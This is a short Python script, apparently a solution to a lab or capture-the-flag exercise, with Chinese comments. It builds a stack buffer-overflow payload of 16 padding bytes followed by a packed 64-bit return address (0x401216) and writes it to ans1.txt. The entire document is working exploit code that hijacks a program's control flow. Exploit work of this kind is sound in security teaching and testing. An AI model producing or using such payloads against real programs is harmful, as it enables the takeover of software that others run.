import struct

def main():
    # 构造 Padding
    padding = b'A' * 16

    # 构造目标地址
    target_addr_int = 0x401216
    target_addr = struct.pack('<Q', target_addr_int)

    # 组合 Payload
    payload = padding + target_addr

    # 写入文件
    with open("ans1.txt", "wb") as f:
        f.write(payload)

    print(f"Payload 已生成到 ans1.txt，总长度: {len(payload)} 字节")

if __name__ == "__main__":
    main()